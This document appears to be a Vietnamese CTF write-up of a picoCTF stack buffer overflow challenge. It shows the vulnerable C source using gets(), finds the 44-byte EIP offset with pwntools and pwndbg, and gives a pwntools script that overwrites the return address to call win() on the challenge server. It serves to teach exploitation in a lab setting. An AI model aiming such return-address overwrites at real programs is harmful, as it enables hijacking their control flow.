<img width="592" height="436" alt="Pasted image 20250925154954" src="https://github.com/user-attachments/assets/f24951d6-f5b0-45e2-a146-dfe476f57982" />

Chạy thử chương trình: <br>
<img width="1272" height="165" alt="Pasted image 20250925155024" src="https://github.com/user-attachments/assets/920b068d-0434-45ea-a8c4-8cbd2e2316aa" />

Thử kiểm tra bằng `checksec`: <br>
<img width="1015" height="310" alt="Pasted image 20250925155928" src="https://github.com/user-attachments/assets/9ba28b07-0fd4-4462-a93f-967e051eee0c" />

Mã nguồn chương trình:
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include "asm.h"

#define BUFSIZE 32
#define FLAGSIZE 64

void win() {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  printf(buf);
}

void vuln(){
  char buf[BUFSIZE];
  gets(buf);

  printf("Okay, time to return... Fingers Crossed... Jumping to 0x%x\n", get_return_address());
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  puts("Please enter your string: ");
  vuln();
  return 0;
}
```


Dễ thấy, để có được flag, ta cần gọi được hàm `win`. Ta tận dụng lỗi buffer overflow, do thấy mảng buf[] được khai báo với 32 ô nhớ, sử dụng `gets()` để nhập (gets() là hàm dễ gây lỗi).

Ta cần tìm **offset** register EIP. Sau ghi đè register này bằng địa chỉ hàm `win()`.
Để tìm được offset này, ta tạo **pattern** với pwntools.
```python
from pwn import *
print(cyclic(1000))
```

```bash
python offset.py > pattern.txt
```

Debug chương trình vuln với `pwndbg`, nạp vào pattern vừa tạo, ta có giá trị trong thanh ghi EIP khi chương trình bị Segmentation Fault: <br>
<img width="1403" height="333" alt="Pasted image 20250925161532" src="https://github.com/user-attachments/assets/4de49de4-0d53-4ff3-864a-e62ca5ec21d5" />


Từ đây ta dò ra được offset, bằng cách tìm xem từ này nằm ở vị trí nào trong `pattern`. Ta có thể tự động hoá việc này bằng `cyclic_find()` tích hợp trong pwntools.
```python
from pwn import *
print(cyclic_find(0x6161616c))
```

<img width="376" height="100" alt="Pasted image 20250925161841" src="https://github.com/user-attachments/assets/fe7993ba-7b65-427b-a118-70bb86899311" />

Như vậy ta có được offset của EIP là 44. <br>
Bây giờ ta cần tìm địa chỉ của hàm `win()`. Ta dùng `disassemble win` trong pwndbg, vậy là có ngay. <br>
<img width="1151" height="582" alt="Pasted image 20250925162148" src="https://github.com/user-attachments/assets/ea2975e0-f69a-423a-ae53-35974493bcfb" />

Giờ ta viết payload với pwntools. Nạp vào 44 bytes đầu để tới được EIP, sau đó chèn địa chỉ của hàm `win()` vào. <br>
```python
from pwn import *

# p = process('./vuln')
host = 'saturn.picoctf.net'
port = 55096
p = remote(host, port)

offset = 44
ret_addr = 0x080491f6

payload = b"A" * offset + p32(ret_addr)
p.sendline(payload)
p.interactive()
```


Chạy `payload.py`, ta có được flag:
<img width="1237" height="350" alt="Pasted image 20250925160749" src="https://github.com/user-attachments/assets/7088c84b-71ef-4de3-b8c1-95f5913a1070" />


